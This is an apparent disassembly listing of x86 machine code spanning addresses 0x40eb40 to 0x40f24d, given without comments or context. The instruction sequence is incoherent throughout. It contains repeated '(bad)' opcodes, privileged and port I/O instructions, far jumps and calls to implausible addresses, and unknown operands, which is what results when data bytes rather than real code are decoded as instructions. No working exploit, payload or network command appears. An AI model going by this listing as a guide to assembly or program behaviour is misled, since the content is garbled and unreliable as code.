  40eb40:	cmp    edx,DWORD PTR [ebp+0x6ab29fa1]
  40eb46:	outs   dx,DWORD PTR ds:[esi]
  40eb47:	fisubr DWORD PTR [eax+0x11]
  40eb4a:	mov    esp,0xfa82b90
  40eb4f:	sahf   
  40eb50:	or     al,0xbb
  40eb52:	test   al,0x4e
  40eb54:	sub    al,BYTE PTR [esp+edi*8+0x269b908c]
  40eb5b:	out    0xdd,eax
  40eb5d:	shr    al,0xc4
  40eb60:	sub    al,0xfa
  40eb62:	mov    WORD PTR [edx-0x1b],?
  40eb65:	xor    al,0xb9
  40eb67:	add    BYTE PTR [ecx-0x36],al
  40eb6a:	fs xor al,0xd7
  40eb6d:	sbb    al,0xf7
  40eb6f:	push   esp
  40eb70:	mov    ds:0xb5236d26,eax
  40eb75:	shl    eax,1
  40eb77:	cmc    
  40eb78:	cmp    eax,0xcd34485
  40eb7d:	or     eax,DWORD PTR [ebx-0x67fb8c27]
  40eb83:	(bad)  
  40eb85:	loop   0x40eb5c
  40eb87:	and    eax,0x29d5afe6
  40eb8c:	jge    0x40eba6
  40eb8e:	outs   dx,DWORD PTR ds:[esi]
  40eb8f:	dec    ecx
  40eb90:	adc    dh,BYTE PTR [ebx-0x69591832]
  40eb96:	fcom   st(1)
  40eb98:	gs pop ebx
  40eb9a:	stos   DWORD PTR es:[edi],eax
  40eb9b:	xor    al,0x85
  40eb9d:	leave  
  40eb9e:	pop    esp
  40eb9f:	fwait
  40eba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba1:	daa    
  40eba2:	sbb    DWORD PTR [eax+0x73],0x58642443
  40eba9:	jns    0x40ebce
  40ebab:	and    al,0x43
  40ebad:	ds jle 0x40ebfb
  40ebb0:	mov    BYTE PTR [ecx-0x7ccac7cb],bl
  40ebb6:	fwait
  40ebb7:	sub    BYTE PTR ds:0x31ee2a82,bh
  40ebbd:	sbb    bh,BYTE PTR [edx]
  40ebbf:	jp     0x40ebcb
  40ebc1:	sub    esi,DWORD PTR [edx]
  40ebc3:	and    BYTE PTR [edx],dh
  40ebc5:	fadd   DWORD PTR [edi]
  40ebc7:	xor    edi,edx
  40ebc9:	aad    0x5b
  40ebcb:	imul   edi,DWORD PTR [edx+edi*2+0x7a],0xffffffc9
  40ebd0:	sahf   
  40ebd1:	leave  
  40ebd2:	repnz xchg esi,eax
  40ebd4:	test   ah,dh
  40ebd6:	push   eax
  40ebd7:	stos   BYTE PTR es:[edi],al
  40ebd8:	loopne 0x40eb78
  40ebda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebdb:	push   edi
  40ebdc:	sub    ebp,DWORD PTR [ebx+0x3b96aca9]
  40ebe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe3:	lock push ecx
  40ebe5:	jg     0x40eb77
  40ebe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe8:	jmp    0x1fad:0x388a839f
  40ebef:	or     ebp,DWORD PTR [ebx-0x11d0435]
  40ebf5:	(bad)  
  40ebf6:	push   esi
  40ebf7:	cmc    
  40ebf8:	imul   ebp,DWORD PTR [edi-0x76],0xfc34143
  40ebff:	mov    eax,ds:0xca5da04e
  40ec04:	pop    eax
  40ec05:	push   es
  40ec06:	out    dx,eax
  40ec07:	lods   al,BYTE PTR ds:[esi]
  40ec08:	pop    es
  40ec09:	cdq    
  40ec0a:	dec    edi
  40ec0b:	push   ss
  40ec0c:	lock jae 0x40ec52
  40ec0f:	sbb    eax,0xab925786
  40ec14:	mov    ebx,DWORD PTR ds:[ecx+0x17e3fe10]
  40ec1b:	sbb    al,0x1c
  40ec1d:	imul   esi,DWORD PTR [esi+0x3f7472d7],0x7831633c
  40ec27:	mov    bl,0xfb
  40ec29:	fistp  WORD PTR [edx-0x63]
  40ec2c:	stos   BYTE PTR es:[edi],al
  40ec2d:	cmp    eax,DWORD PTR [eax-0x60]
  40ec30:	xchg   edx,eax
  40ec31:	add    DWORD PTR [ebx+ebp*8+0x15],0x1804e055
  40ec39:	sbb    DWORD PTR [eax],edi
  40ec3b:	and    al,0x8f
  40ec3d:	sub    eax,0xc9735ff8
  40ec42:	xchg   ecx,eax
  40ec43:	push   eax
  40ec44:	popf   
  40ec45:	in     eax,dx
  40ec46:	mov    cl,0x62
  40ec48:	pop    ds
  40ec49:	lods   eax,DWORD PTR ds:[esi]
  40ec4a:	sbb    al,ah
  40ec4c:	mov    esp,0x145eefe5
  40ec51:	push   es
  40ec52:	out    dx,al
  40ec53:	sub    al,0xb8
  40ec55:	xchg   esp,eax
  40ec56:	push   ds
  40ec57:	pop    edi
  40ec58:	or     al,0x73
  40ec5a:	out    dx,al
  40ec5b:	sti    
  40ec5c:	bound  edi,QWORD PTR [ebx+0x1bee038d]
  40ec62:	sbb    BYTE PTR [ebp+ebx*1+0x5c],ch
  40ec66:	inc    esp
  40ec67:	push   edi
  40ec68:	xor    esi,DWORD PTR [esi+ebp*1]
  40ec6b:	cmp    eax,0x122245aa
  40ec70:	retf   
  40ec71:	and    esp,esp
  40ec73:	xchg   edi,eax
  40ec74:	dec    ecx
  40ec75:	out    0x62,eax
  40ec77:	adc    al,0xa1
  40ec79:	aad    0xa1
  40ec7b:	inc    ebx
  40ec7c:	xchg   DWORD PTR [edx+0x43ac0a23],eax
  40ec82:	sti    
  40ec83:	in     eax,dx
  40ec84:	pushf  
  40ec85:	pop    eax
  40ec86:	cmp    edx,ebp
  40ec88:	push   ds
  40ec89:	dec    eax
  40ec8a:	dec    esi
  40ec8b:	retf   
  40ec8c:	or     DWORD PTR [edx-0x6bc74107],ebp
  40ec92:	xchg   BYTE PTR [eax],ah
  40ec94:	(bad)  
  40ec95:	leave  
  40ec96:	(bad)  
  40ec97:	jmp    0xcc73:0x3326a3c2
  40ec9e:	ds sahf 
  40eca0:	sbb    esi,DWORD PTR [edi+esi*2-0x31]
  40eca4:	cdq    
  40eca5:	icebp  
  40eca6:	sbb    edi,DWORD PTR [esi+0x32]
  40eca9:	bound  esi,QWORD PTR [edx-0x5fdfe556]
  40ecaf:	fs inc edx
  40ecb1:	push   ds
  40ecb2:	xor    BYTE PTR [eax-0x6e76deb2],cl
  40ecb8:	push   ecx
  40ecb9:	cmp    ebp,DWORD PTR [ecx+ebx*2]
  40ecbc:	aam    0x4e
  40ecbe:	or     eax,0xc7663e04
  40ecc3:	pop    edx
  40ecc4:	mov    esp,0x2bb6590e
  40ecc9:	hlt    
  40ecca:	jbe    0x40ecb3
  40eccc:	ror    BYTE PTR [eax+0x48f10c86],1
  40ecd2:	xor    edi,ecx
  40ecd4:	stos   DWORD PTR es:[edi],eax
  40ecd5:	test   esp,edi
  40ecd7:	popf   
  40ecd8:	mov    edi,esp
  40ecda:	pop    edi
  40ecdb:	dec    edx
  40ecdc:	sbb    al,0x7d
  40ecde:	pop    esi
  40ecdf:	jg     0x40ed18
  40ece1:	(bad)  
  40ece2:	ror    DWORD PTR [edi+0xc],1
  40ece5:	clc    
  40ece6:	push   edi
  40ece7:	sbb    esi,DWORD PTR [esi+0x73]
  40ecea:	int    0x32
  40ecec:	das    
  40eced:	fldcw  WORD PTR [ecx-0x38]
  40ecf0:	inc    ecx
  40ecf1:	(bad)  
  40ecf2:	jo     0x40ec8c
  40ecf4:	ror    eax,1
  40ecf6:	aad    0xb4
  40ecf8:	(bad)  
  40ecf9:	addr16 mov al,0xb9
  40ecfc:	mov    ah,0x88
  40ecfe:	(bad)  
  40ecff:	pop    ecx
  40ed00:	cmc    
  40ed01:	daa    
  40ed02:	or     eax,0x5808782e
  40ed07:	rcr    BYTE PTR [eax+0x27],1
  40ed0a:	cwde   
  40ed0b:	push   ebp
  40ed0c:	into   
  40ed0d:	adc    edi,eax
  40ed0f:	aad    0xba
  40ed11:	inc    edx
  40ed12:	adc    dl,BYTE PTR [ecx+esi*1+0x35]
  40ed16:	outs   dx,DWORD PTR ds:[esi]
  40ed17:	lahf   
  40ed18:	sar    BYTE PTR [eax],1
  40ed1a:	int3   
  40ed1b:	cli    
  40ed1c:	xor    DWORD PTR [edx-0x55d6bd23],edx
  40ed22:	dec    esp
  40ed23:	mov    DWORD PTR [esi+0x398c752],edi
  40ed29:	out    0xfa,al
  40ed2b:	into   
  40ed2c:	push   ss
  40ed2d:	mov    ds:0x7b7c9814,al
  40ed32:	test   eax,0xc108a33c
  40ed37:	lods   al,BYTE PTR ds:[esi]
  40ed38:	arpl   WORD PTR [edi],dx
  40ed3a:	mov    eax,?
  40ed3c:	dec    ebp
  40ed3d:	xchg   ebp,eax
  40ed3e:	mov    ds,WORD PTR [edx-0x336ec9b7]
  40ed44:	es imul eax,ebx,0x6aec7d6a
  40ed4b:	jmp    FWORD PTR [edx-0x1]
  40ed4e:	mov    cs,WORD PTR [ecx+ebp*8-0x73]
  40ed52:	ja     0x40ed47
  40ed54:	leave  
  40ed55:	shl    BYTE PTR [edx],0x64
  40ed58:	popf   
  40ed59:	inc    esp
  40ed5a:	dec    ebp
  40ed5b:	mov    ah,0x33
  40ed5d:	sbb    al,0xd6
  40ed5f:	popa   
  40ed60:	dec    edi
  40ed61:	fist   WORD PTR [ebx]
  40ed63:	push   esp
  40ed64:	inc    ebp
  40ed65:	stos   DWORD PTR es:[edi],eax
  40ed66:	xlat   BYTE PTR ds:[ebx]
  40ed67:	aas    
  40ed68:	cwde   
  40ed69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6a:	lea    edi,[edx]
  40ed6c:	or     ecx,DWORD PTR [edx]
  40ed6e:	bound  ecx,QWORD PTR [ebp-0x2e]
  40ed71:	dec    ecx
  40ed72:	mov    eax,0x9da97643
  40ed77:	bound  ecx,QWORD PTR [ebx+0x2779f5df]
  40ed7d:	pop    edi
  40ed7e:	cli    
  40ed7f:	sub    eax,0x85d0f22a
  40ed84:	mov    dl,0x2d
  40ed86:	adc    al,0xca
  40ed88:	cmp    edi,DWORD PTR [edx]
  40ed8a:	xchg   edi,eax
  40ed8b:	push   ebp
  40ed8c:	push   ebx
  40ed8d:	in     al,0xe3
  40ed8f:	mov    dh,0x39
  40ed91:	call   0x8766ac92
  40ed96:	xor    edx,DWORD PTR [ecx-0x69d0fe74]
  40ed9c:	ins    BYTE PTR es:[edi],dx
  40ed9d:	push   0xcfaf8a81
  40eda2:	sub    esp,eax
  40eda4:	sub    ah,dl
  40eda6:	pusha  
  40eda7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eda8:	mov    edx,DWORD PTR [esp+ecx*8]
  40edab:	(bad)  
  40edac:	push   esp
  40edad:	sub    eax,0x34aee562
  40edb2:	aaa    
  40edb3:	stc    
  40edb4:	jl     0x40ed67
  40edb6:	lahf   
  40edb7:	sub    al,0x31
  40edba:	inc    esi
  40edbb:	cmp    al,0x17
  40edbd:	frstor [ecx+ebx*2+0x6a938a4b]
  40edc4:	ror    BYTE PTR gs:[edx-0x582bb314],cl
  40edcb:	inc    ebx
  40edcc:	push   esi
  40edcd:	add    eax,0xe266128
  40edd2:	dec    ecx
  40edd3:	jnp    0x40eda7
  40edd5:	push   ecx
  40edd6:	ins    DWORD PTR es:[edi],dx
  40edd7:	popf   
  40edd8:	invd   
  40edda:	ja     0x40eda9
  40eddc:	sti    
  40eddd:	in     eax,dx
  40edde:	je     0x40ee16
  40ede0:	or     al,0xc3
  40ede2:	mov    ds:0x2add0edd,al
  40ede7:	mov    al,ds:0x2a7d70f4
  40edec:	inc    ebx
  40eded:	stos   DWORD PTR es:[edi],eax
  40edee:	cmp    al,0x21
  40edf0:	sbb    BYTE PTR [ebx-0xb],dl
  40edf3:	ret    0xa010
  40edf6:	xchg   ebx,eax
  40edf7:	repnz sar al,cl
  40edfa:	stos   BYTE PTR es:[edi],al
  40edfb:	out    dx,al
  40edfc:	hlt    
  40edfd:	jp     0x40ee71
  40edff:	call   0x96afcf23
  40ee04:	out    dx,al
  40ee05:	dec    esp
  40ee06:	or     ecx,DWORD PTR [ecx+0x61]
  40ee09:	inc    eax
  40ee0a:	pop    esi
  40ee0b:	sbb    edx,esi
  40ee0d:	cmp    al,0x2
  40ee0f:	stos   BYTE PTR es:[edi],al
  40ee10:	loope  0x40ee77
  40ee12:	inc    esi
  40ee13:	ja     0x40ee91
  40ee15:	test   BYTE PTR [esi-0x24bf96aa],dh
  40ee1b:	clc    
  40ee1c:	aam    0xd2
  40ee1e:	cs xchg ch,bl
  40ee21:	push   esi
  40ee22:	in     al,0x57
  40ee24:	jmp    0xbd3196f
  40ee29:	imul   edx,DWORD PTR [ebp+edx*4-0x7f6c3eae],0x3a
  40ee31:	outs   dx,DWORD PTR ds:[esi]
  40ee32:	mul    bh
  40ee34:	mov    bh,0x31
  40ee36:	outs   dx,DWORD PTR ds:[esi]
  40ee37:	es push esp
  40ee39:	dec    edi
  40ee3a:	out    0xaa,al
  40ee3c:	loop   0x40ee3f
  40ee3e:	pop    edx
  40ee3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee40:	mov    ebx,0xfb5eb5c7
  40ee45:	adc    edi,eax
  40ee47:	mov    ds:0xa5ddfca6,al
  40ee4c:	dec    esp
  40ee4d:	inc    edi
  40ee4e:	arpl   WORD PTR [eax],di
  40ee50:	cld    
  40ee51:	mov    ds:0x8f54883b,eax
  40ee56:	sbb    al,0xd5
  40ee58:	dec    ecx
  40ee59:	jbe    0x40ee5c
  40ee5b:	jo     0x40eed7
  40ee5d:	xor    BYTE PTR [ebx],ah
  40ee5f:	push   cs
  40ee60:	dec    edi
  40ee61:	add    BYTE PTR [edx],al
  40ee63:	cmp    BYTE PTR [ebp-0x77],0xa7
  40ee67:	cli    
  40ee68:	out    0x66,al
  40ee6a:	sub    eax,0x570d581b
  40ee6f:	mov    ds:0x93025625,al
  40ee74:	pop    ebx
  40ee75:	and    al,0x1f
  40ee77:	loopne 0x40ee3f
  40ee79:	jl     0x40ee99
  40ee7b:	imul   eax,DWORD PTR [ecx+0x7c],0x5
  40ee7f:	mov    bl,0xab
  40ee81:	add    DWORD PTR [ebp-0x2c],esi
  40ee84:	xchg   ebp,eax
  40ee85:	mov    bh,0x8
  40ee87:	dec    esi
  40ee88:	je     0x40eeef
  40ee8a:	jnp    0x40eee4
  40ee8c:	cmp    al,dh
  40ee8e:	mov    dh,0xcb
  40ee90:	sbb    al,0xb6
  40ee92:	push   ss
  40ee93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee94:	mov    ds:0x1303fcdf,al
  40ee99:	not    BYTE PTR [ebx+0x30bc321f]
  40ee9f:	fidivr WORD PTR ds:0xfbb16971
  40eea5:	cwde   
  40eea6:	bnd jp 0x40eedf
  40eea9:	arpl   WORD PTR [ecx],bx
  40eeab:	loop   0x40ef2c
  40eead:	adc    BYTE PTR [edx+0x27],ch
  40eeb0:	cdq    
  40eeb1:	xor    DWORD PTR [edx+0x10a0994],edx
  40eeb7:	retf   
  40eeb8:	aam    0xcd
  40eeba:	fucom  st(7)
  40eebc:	lahf   
  40eebd:	xchg   DWORD PTR [ecx],eax
  40eebf:	hlt    
  40eec0:	sbb    al,0x0
  40eec2:	mov    ds:0x716fcbc8,eax
  40eec7:	and    BYTE PTR [edi+0x3b],ah
  40eeca:	aad    0x7c
  40eecc:	aad    0x4b
  40eece:	nop
  40eecf:	sbb    edi,ebp
  40eed1:	sub    cl,BYTE PTR [ebp-0x4190d6e8]
  40eed7:	xor    dl,BYTE PTR [ebx+0x39a53805]
  40eedd:	inc    esp
  40eede:	sub    cl,BYTE PTR [eax-0x3f90441d]
  40eee4:	jmp    0x55f75a79
  40eee9:	mov    esi,0xd192c2bd
  40eeee:	or     al,BYTE PTR [edi]
  40eef0:	mov    ecx,0x6ad5e90e
  40eef5:	and    BYTE PTR [ecx-0x1a],cl
  40eef8:	xchg   edi,eax
  40eef9:	cmp    DWORD PTR [eax],esi
  40eefb:	cmp    eax,0x8ff2f4dd
  40ef00:	mov    eax,ds:0xe1147eb5
  40ef05:	es loope 0x40ef82
  40ef08:	inc    edx
  40ef09:	sbb    al,0xe6
  40ef0b:	call   0xb6b46c8b
  40ef10:	xchg   ecx,eax
  40ef12:	sub    esi,edi
  40ef14:	das    
  40ef15:	lods   al,BYTE PTR ds:[esi]
  40ef16:	fcomi  st,st(6)
  40ef18:	xchg   BYTE PTR [eiz*4+0x2c1b11aa],dh
  40ef1f:	pop    ds
  40ef20:	enter  0x8318,0x55
  40ef24:	mov    edi,0x5a017ef9
  40ef29:	jno    0x40eec8
  40ef2b:	repnz dec edx
  40ef2d:	stos   BYTE PTR es:[edi],al
  40ef2e:	fidivr DWORD PTR ds:0x317da42c
  40ef34:	jmp    0x40eeeb
  40ef36:	pop    ebp
  40ef37:	fsubr  DWORD PTR [ebx+0xfc904a2]
  40ef3d:	jb     0x40eeec
  40ef3f:	neg    DWORD PTR [eax-0x2a]
  40ef42:	loop   0x40eee1
  40ef44:	repnz or al,0x5a
  40ef47:	xchg   BYTE PTR [edx+0x42db3765],ah
  40ef4d:	adc    cl,BYTE PTR [ebp+0x2b]
  40ef50:	pop    ebx
  40ef51:	push   edi
  40ef52:	dec    ebx
  40ef53:	test   eax,0xdad034a4
  40ef58:	dec    esi
  40ef59:	mov    bl,0xe6
  40ef5b:	xchg   ecx,eax
  40ef5c:	push   0x74
  40ef5e:	(bad)  
  40ef5f:	fstp   DWORD PTR [esi-0x55]
  40ef62:	fsubrp st(7),st
  40ef64:	das    
  40ef65:	not    DWORD PTR [ecx]
  40ef67:	dec    eax
  40ef68:	push   esi
  40ef69:	and    al,0x5e
  40ef6b:	pop    ss
  40ef6c:	stos   DWORD PTR es:[edi],eax
  40ef6d:	dec    eax
  40ef6e:	dec    ecx
  40ef6f:	loopne 0x40efa3
  40ef71:	into   
  40ef72:	push   eax
  40ef73:	jo     0x40ef62
  40ef75:	idiv   BYTE PTR [ebx-0x4c]
  40ef78:	aaa    
  40ef79:	ficom  DWORD PTR [esi]
  40ef7b:	(bad)  
  40ef7c:	out    dx,al
  40ef7d:	add    ch,bh
  40ef7f:	pop    es
  40ef80:	fmulp  st(2),st
  40ef82:	ins    DWORD PTR es:[edi],dx
  40ef83:	dec    eax
  40ef84:	fisub  DWORD PTR [ebp+0x37]
  40ef87:	bnd jg 0x40efec
  40ef8a:	sbb    eax,0x8b6ef169
  40ef8f:	inc    edi
  40ef90:	cmp    DWORD PTR [ebp+ebx*1+0x7f1f2277],eax
  40ef97:	mov    WORD PTR [ecx-0x30],?
  40ef9a:	dec    eax
  40ef9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef9c:	or     al,0xdc
  40ef9e:	push   ebx
  40ef9f:	pop    esi
  40efa0:	adc    eax,0xcdca7bc3
  40efa5:	test   al,0x61
  40efa7:	push   ebp
  40efa8:	call   0x8e2fbd2c
  40efad:	add    edx,0xffffffe5
  40efb0:	idiv   DWORD PTR [ecx]
  40efb2:	daa    
  40efb3:	je     0x40efcb
  40efb5:	jo     0x40f005
  40efb7:	(bad)  
  40efb9:	jno    0x40efe9
  40efbb:	les    esi,FWORD PTR [ebp-0xb]
  40efbe:	into   
  40efbf:	pop    ss
  40efc0:	popf   
  40efc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc2:	adc    eax,0x10e09292
  40efc7:	or     esi,esp
  40efc9:	mov    ebp,DWORD PTR [ebx-0x1d]
  40efcc:	sbb    ebp,DWORD PTR [ecx]
  40efce:	in     al,dx
  40efcf:	outs   dx,DWORD PTR ds:[esi]
  40efd0:	or     DWORD PTR [ebx],ebp
  40efd2:	test   DWORD PTR [edi-0x3d1ba041],esi
  40efd8:	push   edx
  40efd9:	(bad)  
  40efda:	repz pop eax
  40efdc:	int3   
  40efdd:	cld    
  40efde:	es sbb eax,0x88e18e16
  40efe4:	jne    0x40f025
  40efe6:	in     eax,dx
  40efe7:	mov    ds:0x91ee0922,al
  40efec:	cmp    BYTE PTR [eax+ecx*1+0x1e],al
  40eff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eff1:	mov    dl,0xa2
  40eff3:	xor    eax,0x68e071da
  40eff8:	jl     0x40ef7c
  40effa:	xor    eax,0x14fbdc1b
  40efff:	push   edx
  40f000:	xchg   BYTE PTR [edx],ah
  40f002:	sbb    eax,0xde94cf00
  40f007:	mov    DWORD PTR [ecx],esp
  40f009:	mov    cl,0xd1
  40f00b:	push   esp
  40f00c:	scas   al,BYTE PTR es:[edi]
  40f00d:	pusha  
  40f00e:	mov    WORD PTR [esp+ebp*1],fs
  40f011:	mov    ecx,0xdaf129e9
  40f016:	jo     0x40ef99
  40f018:	ds sbb eax,0xffffff87
  40f01c:	sahf   
  40f01d:	and    ah,BYTE PTR [edi-0x3a5c6df3]
  40f023:	leave  
  40f024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f025:	(bad)  
  40f026:	popa   
  40f027:	dec    ecx
  40f028:	mov    bh,0xa7
  40f02a:	data16 ins BYTE PTR es:[edi],dx
  40f02c:	mov    esp,0xef09ae7a
  40f031:	ss mov ecx,0x283e11c9
  40f037:	fld    st(0)
  40f039:	sbb    al,0x89
  40f03b:	xchg   edx,eax
  40f03c:	adc    eax,0x133e3de9
  40f041:	dec    ebp
  40f042:	mov    ds:0xc4b21e55,eax
  40f047:	adc    dl,BYTE PTR [ebp+0x221cfe97]
  40f04d:	pop    ds
  40f04e:	mov    dl,0x69
  40f050:	mov    dx,0x4a44
  40f054:	adc    esi,DWORD PTR [edx-0x2f0f0c61]
  40f05a:	mov    eax,0xc4bc1e89
  40f05f:	loope  0x40f079
  40f061:	cdq    
  40f062:	push   es
  40f063:	inc    edi
  40f064:	mov    DWORD PTR ds:0x9e746ac2,ebp
  40f06a:	adc    ebp,DWORD PTR [eax-0x35]
  40f06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f06f:	or     al,0xdf
  40f071:	pusha  
  40f072:	dec    esp
  40f073:	mov    bh,0x3e
  40f075:	sti    
  40f076:	pop    edi
  40f077:	retf   0x3285
  40f07a:	jbe    0x40f085
  40f07c:	cmp    ch,BYTE PTR [ecx+0x697cebcb]
  40f082:	dec    eax
  40f083:	clc    
  40f084:	mov    eax,0x3e0dee5c
  40f089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f08a:	test   DWORD PTR ds:0xb4ad06c7,0x561b6bd6
  40f094:	add    eax,0xf74f0b3f
  40f099:	imul   edx,edx,0x5b
  40f09c:	mov    bl,0xdd
  40f09e:	cmp    DWORD PTR [ebx+0x15],0x152c0a3f
  40f0a5:	dec    esi
  40f0a6:	dec    esi
  40f0a7:	or     bl,BYTE PTR [edi]
  40f0a9:	and    al,0x9d
  40f0ab:	push   edi
  40f0ac:	jne    0x40f0ea
  40f0ae:	mov    al,0x7e
  40f0b0:	and    eax,0xb07f950f
  40f0b5:	pushf  
  40f0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b7:	inc    esp
  40f0b8:	and    esi,DWORD PTR [ebx-0x3e]
  40f0bb:	js     0x40f0d4
  40f0bd:	adc    BYTE PTR [eax+0x2f9560ea],al
  40f0c3:	xor    cl,0xe
  40f0c6:	les    ecx,FWORD PTR [ecx-0x20ba33e1]
  40f0cc:	xchg   edi,eax
  40f0cd:	sbb    dh,BYTE PTR [ebx]
  40f0cf:	dec    ecx
  40f0d0:	jmp    0x707b07e1
  40f0d5:	dec    esi
  40f0d6:	or     BYTE PTR [ebx+0xc],bh
  40f0d9:	fwait
  40f0da:	out    0x5b,al
  40f0dc:	sbb    al,BYTE PTR [esi+0x5c3df8]
  40f0e2:	cmp    al,0xe7
  40f0e4:	loop   0x40f0c0
  40f0e6:	not    BYTE PTR [edi-0x12033f6d]
  40f0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ed:	enter  0x8fe4,0x36
  40f0f1:	inc    edx
  40f0f2:	aam    0xa3
  40f0f4:	dec    eax
  40f0f5:	pop    ebp
  40f0f6:	cmp    BYTE PTR [ebx-0x2158cf5],dh
  40f0fc:	inc    esp
  40f0fd:	dec    ecx
  40f0fe:	inc    eax
  40f0ff:	iret   
  40f100:	mov    bl,0x6a
  40f102:	jmp    0xabac:0xdfe2b77a
  40f109:	sbb    BYTE PTR [ecx-0x57],cl
  40f10c:	xchg   ebx,eax
  40f10d:	or     DWORD PTR [ebp-0x34],0xffffffbb
  40f111:	pop    ss
  40f112:	dec    ecx
  40f113:	je     0x40f127
  40f115:	fistp  QWORD PTR [esi-0x130bf682]
  40f11b:	cmp    BYTE PTR gs:[eax+0x4],bl
  40f11f:	arpl   WORD PTR [ebp-0x8],bp
  40f122:	retf   
  40f123:	call   FWORD PTR [edx+0x50]
  40f126:	retf   
  40f127:	or     eax,0xd774bb25
  40f12c:	jne    0x40f185
  40f12e:	popf   
  40f12f:	ss pop edx
  40f131:	inc    ebx
  40f132:	daa    
  40f133:	jp     0x40f0f2
  40f135:	cmc    
  40f136:	out    0xb9,al
  40f138:	or     eax,esp
  40f13a:	mov    cl,0xb8
  40f13c:	shr    DWORD PTR ds:0x76794a93,1
  40f142:	sub    eax,0x280e119
  40f147:	xor    ebx,DWORD PTR [ebp+0x3b]
  40f14a:	ret    
  40f14b:	jmp    0x40f172
  40f14d:	xor    BYTE PTR [esi+0x21],cl
  40f150:	mov    ah,0xad
  40f152:	mov    eax,ds:0x30b5268c
  40f157:	hlt    
  40f158:	sbb    eax,0x974e6c23
  40f15d:	add    al,0xbe
  40f15f:	adc    DWORD PTR [eax],ebp
  40f161:	xchg   ecx,eax
  40f162:	xchg   ebx,eax
  40f163:	xor    DWORD PTR [eax],ebp
  40f165:	rol    BYTE PTR [ecx-0x47c3f32],1
  40f16b:	cmc    
  40f16c:	int3   
  40f16d:	icebp  
  40f16e:	dec    eax
  40f16f:	add    ebx,eax
  40f171:	dec    edx
  40f172:	inc    ebp
  40f173:	test   BYTE PTR [edi-0xf62121d],0x88
  40f17a:	cmp    eax,DWORD PTR [esi+eax*4]
  40f17d:	ins    DWORD PTR es:[edi],dx
  40f17e:	mov    bh,0x9c
  40f180:	mov    ds:0xc2aa99bb,eax
  40f185:	jbe    0x40f10d
  40f187:	out    dx,al
  40f188:	push   eax
  40f189:	shl    BYTE PTR [ebp-0x46b54427],cl
  40f18f:	les    edx,FWORD PTR [ecx-0x42]
  40f192:	pop    ss
  40f193:	les    ecx,FWORD PTR [ecx+eiz*8-0x38]
  40f197:	enter  0x8784,0xff
  40f19b:	inc    esi
  40f19c:	xor    al,0x66
  40f19e:	loop   0x40f1c6
  40f1a0:	xor    eax,0xd4e2b527
  40f1a5:	imul   ecx,DWORD PTR [ebx+esi*4-0x3096371c],0x42
  40f1ad:	sahf   
  40f1ae:	int3   
  40f1af:	(bad)  
  40f1b0:	pop    ds
  40f1b1:	imul   ebx,DWORD PTR [ebx],0xffffffef
  40f1b4:	inc    eax
  40f1b5:	or     eax,0x842798e1
  40f1ba:	sbb    eax,0x767c9435
  40f1bf:	pop    edi
  40f1c0:	mov    dl,0x14
  40f1c2:	sub    edi,DWORD PTR [edx]
  40f1c4:	mov    BYTE PTR [ebx-0x2],ch
  40f1c7:	or     dh,0xcc
  40f1ca:	push   esi
  40f1cb:	xchg   ebx,eax
  40f1cc:	(bad)  
  40f1cd:	scas   al,BYTE PTR es:[edi]
  40f1ce:	fild   WORD PTR [edx-0x17d79e5d]
  40f1d4:	outs   dx,BYTE PTR ds:[esi]
  40f1d5:	or     al,0xfe
  40f1d7:	sbb    cl,BYTE PTR [ebx+0x22bbe67d]
  40f1dd:	jg     0x40f16c
  40f1df:	inc    esp
  40f1e0:	cld    
  40f1e1:	ins    BYTE PTR es:[edi],dx
  40f1e2:	ret    
  40f1e3:	jecxz  0x40f166
  40f1e5:	(bad)  
  40f1e6:	dec    esi
  40f1e7:	inc    edi
  40f1e8:	sbb    al,0x80
  40f1ea:	sbb    al,0x2b
  40f1ec:	cmp    ebx,edi
  40f1ee:	dec    esp
  40f1ef:	stos   BYTE PTR es:[edi],al
  40f1f0:	add    BYTE PTR [esi+0x3ab761ba],ah
  40f1f6:	mov    esi,0x18c2da2d
  40f1fb:	retf   
  40f1fc:	mov    bl,BYTE PTR [eax]
  40f1fe:	daa    
  40f1ff:	das    
  40f200:	sub    BYTE PTR ds:[edi],ah
  40f203:	fcmovnu st,st(4)
  40f205:	int3   
  40f206:	push   0x6ca9f2c4
  40f20b:	push   esp
  40f20c:	sbb    al,0xa5
  40f20e:	sub    edx,DWORD PTR [bx+si]
  40f211:	or     dl,BYTE PTR [ebx+0x6a]
  40f214:	ret    
  40f215:	rcr    BYTE PTR [eax],1
  40f217:	arpl   WORD PTR [ebx-0x203ae2d9],ax
  40f21d:	add    BYTE PTR [ebx+0x3],dl
  40f220:	xchg   ebx,eax
  40f221:	and    eax,0x4087ac75
  40f226:	mov    ds:0x62b5273,al
  40f22b:	push   eax
  40f22c:	jp     0x40f1d2
  40f22e:	mov    cl,BYTE PTR [esi+0xc]
  40f231:	popa   
  40f232:	loopne 0x40f204
  40f234:	sahf   
  40f235:	fs sti 
  40f237:	mov    ds:0xed227ee2,al
  40f23c:	pop    ecx
  40f23d:	mov    ah,0xab
  40f23f:	mov    ebp,esi
  40f241:	pop    eax
  40f242:	nop
  40f243:	shr    ah,1
  40f245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f246:	arpl   cx,di
  40f248:	dec    ebx
  40f249:	in     al,dx
  40f24a:	jbe    0x40f20a
  40f24c:	push   es
  40f24d:	xor    dl,BYTE PTR [ebp+0x6e]
